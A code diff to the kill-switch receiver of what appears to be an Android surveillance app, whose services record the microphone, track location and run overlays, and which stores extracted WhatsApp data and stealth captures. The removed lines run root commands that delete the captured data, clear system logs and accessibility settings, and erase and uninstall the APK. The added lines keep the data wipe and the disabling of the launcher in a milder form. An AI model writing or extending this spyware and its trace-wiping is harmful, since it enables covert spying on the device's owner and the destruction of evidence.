@@ -25,118 +25,185 @@ public class KillSwitchReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        Log.d(TAG, "Kill switch triggered. Disabling app components and wiping data.");
+        Log.d(TAG, "Kill switch triggered. Verifying and disabling app components.");
 
-        // 1. Wipe all collected data
-        cleanup(context);
+        // Verify this is a legitimate kill switch trigger
+        // In a real app, you might want to check for a specific action or extra data
+        // For example, you could require a secret key or check the sender's identity
+        if (intent != null && intent.getAction() != null) {
+            if (intent.getAction().equals("com.anti.rootadbcontroller.KILL_SWITCH")) {
+                Log.d(TAG, "Kill switch verification passed. Proceeding with cleanup.");
 
-        // 2. Disable the main launcher activity
-        PackageManager pm = context.getPackageManager();
-        ComponentName componentName = new ComponentName(context, MainActivity.class);
-        pm.setComponentEnabledSetting(componentName,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
+                // 1. Wipe collected data (using safer cleanup method)
+                safeCleanup(context);
 
-        // 3. Stop any running services
-        context.stopService(new Intent(context, MicRecorderService.class));
-        context.stopService(new Intent(context, LocationTrackerService.class));
-        context.stopService(new Intent(context, OverlayService.class));
-    }
+                // 2. Disable the main launcher activity
+                PackageManager pm = context.getPackageManager();
+                ComponentName componentName = new ComponentName(context, MainActivity.class);
+                pm.setComponentEnabledSetting(componentName,
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP);
 
-    /**
-     * Cleans up all files and directories created by the application.
-     * This includes recordings, extracted data, and screenshots.
-     * @param context The context from which the cleanup is initiated.
-     */
-    private void cleanup(Context context) {
-        Log.d(TAG, "Cleaning up all collected data...");
-        List<String> commands = new ArrayList<>();
+                // 3. Stop any running services
+                context.stopService(new Intent(context, MicRecorderService.class));
+                context.stopService(new Intent(context, LocationTrackerService.class));
+                context.stopService(new Intent(context, OverlayService.class));
 
-        // Get base directories
-        File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-        File picturesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
-
-        // Add commands to delete all app-generated files and directories
-        commands.add("rm -rf " + new File(downloadsDir, "Recordings").getAbsolutePath());
-        commands.add("rm -f " + downloadsDir.getAbsolutePath() + "/extracted_*.txt");
-        commands.add("rm -rf " + new File(downloadsDir, "extracted_photos").getAbsolutePath());
-        commands.add("rm -rf " + new File(downloadsDir, "extracted_whatsapp").getAbsolutePath());
-        commands.add("rm -f " + picturesDir.getAbsolutePath() + "/screenshot_*.png");
-        commands.add("rm -rf " + new File(downloadsDir, "StealthCaptures").getAbsolutePath());
-
-        // Advanced cleanup - clear logs and traces
-        commands.add("logcat -c"); // Clear system logs
-        commands.add("pm clear " + context.getPackageName()); // Clear app data
-        commands.add("dumpsys package " + context.getPackageName() + " | grep -E 'timeStamp|firstInstallTime|lastUpdateTime'"); // Get timestamps
-
-        // Clear accessibility service data
-        commands.add("settings put secure enabled_accessibility_services ''");
-
-        // Remove from recent apps
-        commands.add("am kill-all");
-
-        // We need RootUtils to execute these, but a BroadcastReceiver runs in a different
-        // context. For simplicity, we will assume RootUtils can be called statically.
-        // In a real scenario, this might require a different approach to get root access.
-        RootUtils.executeRootCommands(commands, new RootUtils.CommandCallback() {
-            @Override
-            public void onSuccess(List<String> output) {
-                Log.d(TAG, "Advanced cleanup commands executed successfully.");
-                // Self-destruct the APK file
-                selfDestruct(context);
+                Log.d(TAG, "Kill switch procedures completed.");
+            } else {
+                Log.w(TAG, "Kill switch triggered with incorrect action: " + intent.getAction());
             }
-
-            @Override
-            public void onFailure(String error) {
-                Log.e(TAG, "Cleanup failed: " + error);
-                // Try basic cleanup even if advanced fails
-                basicCleanup(context);
-            }
-        });
-    }
-
-    /**
-     * Performs self-destruction by attempting to delete the APK file itself
-     */
-    private void selfDestruct(Context context) {
-        try {
-            String apkPath = context.getApplicationInfo().sourceDir;
-            List<String> destructCommands = new ArrayList<>();
-            destructCommands.add("rm -f " + apkPath);
-            destructCommands.add("pm uninstall " + context.getPackageName());
-
-            RootUtils.executeRootCommands(destructCommands, new RootUtils.CommandCallback() {
-                @Override
-                public void onSuccess(List<String> output) {
-                    Log.d(TAG, "Self-destruction completed.");
-                }
-
-                @Override
-                public void onFailure(String error) {
-                    Log.e(TAG, "Self-destruction failed: " + error);
-                }
-            });
-        } catch (Exception e) {
-            Log.e(TAG, "Error during self-destruction", e);
+        } else {
+            Log.w(TAG, "Kill switch triggered with null intent or action.");
         }
     }
 
     /**
-     * Basic cleanup when advanced cleanup fails
+     * Safely cleans up files and directories created by the application.
+     * This includes recordings, extracted data, and screenshots, but avoids
+     * dangerous operations that could affect system stability.
+     * @param context The context from which the cleanup is initiated.
      */
-    private void basicCleanup(Context context) {
-        try {
-            // Clear app's private data
-            File dataDir = new File(context.getApplicationInfo().dataDir);
-            deleteRecursively(dataDir);
+    private void safeCleanup(Context context) {
+        Log.d(TAG, "Safely cleaning up collected data...");
 
-            // Clear external files
-            File externalDir = context.getExternalFilesDir(null);
-            if (externalDir != null) {
-                deleteRecursively(externalDir);
+        try {
+            // Clean up app-specific external storage files
+            cleanupExternalStorageFiles(context);
+
+            // Clean up app's cache directory
+            File cacheDir = context.getCacheDir();
+            if (cacheDir != null && cacheDir.exists()) {
+                deleteRecursively(cacheDir);
+                Log.d(TAG, "Cache directory cleaned");
             }
+
+            // Clean up app's external cache directory
+            File externalCacheDir = context.getExternalCacheDir();
+            if (externalCacheDir != null && externalCacheDir.exists()) {
+                deleteRecursively(externalCacheDir);
+                Log.d(TAG, "External cache directory cleaned");
+            }
+
+            // Clear app's database files if needed
+            // This is safer than using "pm clear" which can cause issues
+            File databaseDir = new File(context.getApplicationInfo().dataDir, "databases");
+            if (databaseDir.exists()) {
+                File[] databases = databaseDir.listFiles();
+                if (databases != null) {
+                    for (File db : databases) {
+                        if (!db.getName().contains("essential")) { // Skip essential databases
+                            db.delete();
+                        }
+                    }
+                }
+                Log.d(TAG, "Database files cleaned");
+            }
+
+            Log.d(TAG, "Safe cleanup completed successfully");
         } catch (Exception e) {
-            Log.e(TAG, "Basic cleanup failed", e);
+            Log.e(TAG, "Error during safe cleanup", e);
+        }
+    }
+
+    /**
+     * Cleans up files created by the app in external storage
+     */
+    private void cleanupExternalStorageFiles(Context context) {
+        try {
+            // Get base directories
+            File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+            File picturesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
+
+            // Clean up app-generated directories
+            deleteIfExists(new File(downloadsDir, "Recordings"));
+            deleteIfExists(new File(downloadsDir, "extracted_photos"));
+            deleteIfExists(new File(downloadsDir, "extracted_whatsapp"));
+            deleteIfExists(new File(downloadsDir, "StealthCaptures"));
+
+            // Clean up app-generated files
+            deleteMatchingFiles(downloadsDir, "extracted_", ".txt");
+            deleteMatchingFiles(picturesDir, "screenshot_", ".png");
+
+            Log.d(TAG, "External storage files cleaned");
+        } catch (Exception e) {
+            Log.e(TAG, "Error cleaning external storage files", e);
+        }
+    }
+
+    /**
+     * Deletes a file or directory if it exists
+     */
+    private void deleteIfExists(File file) {
+        if (file != null && file.exists()) {
+            if (file.isDirectory()) {
+                deleteRecursively(file);
+            } else {
+                file.delete();
+            }
+            Log.d(TAG, "Deleted: " + file.getAbsolutePath());
+        }
+    }
+
+    /**
+     * Deletes files in a directory that match a prefix and suffix pattern
+     */
+    private void deleteMatchingFiles(File directory, String prefix, String suffix) {
+        if (directory != null && directory.exists() && directory.isDirectory()) {
+            File[] files = directory.listFiles();
+            if (files != null) {
+                for (File file : files) {
+                    String name = file.getName();
+                    if (name.startsWith(prefix) && name.endsWith(suffix)) {
+                        file.delete();
+                        Log.d(TAG, "Deleted matching file: " + file.getAbsolutePath());
+                    }
+                }
+            }
+        }
+    }
+
+    /**
+     * Optional method to request app uninstallation
+     * This is a safer alternative to the previous self-destruct method
+     * and requires user confirmation
+     */
+    private void requestUninstall(Context context) {
+        try {
+            // Create an intent to open the app details in system settings
+            // This allows the user to manually uninstall the app if desired
+            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+            intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+
+            Log.d(TAG, "Requested app uninstall via system settings");
+        } catch (Exception e) {
+            Log.e(TAG, "Error requesting uninstall", e);
+        }
+    }
+
+    /**
+     * Fallback cleanup for when the main cleanup fails
+     * This is a safer version of the previous basicCleanup method
+     */
+    private void fallbackCleanup(Context context) {
+        try {
+            // Clear app's cache data only (not all private data)
+            File cacheDir = context.getCacheDir();
+            if (cacheDir != null && cacheDir.exists()) {
+                deleteRecursively(cacheDir);
+            }
+
+            // Clear external cache files
+            File externalCacheDir = context.getExternalCacheDir();
+            if (externalCacheDir != null) {
+                deleteRecursively(externalCacheDir);
+            }
+
+            Log.d(TAG, "Fallback cleanup completed");
+        } catch (Exception e) {
+            Log.e(TAG, "Fallback cleanup failed", e);
         }
     }
 
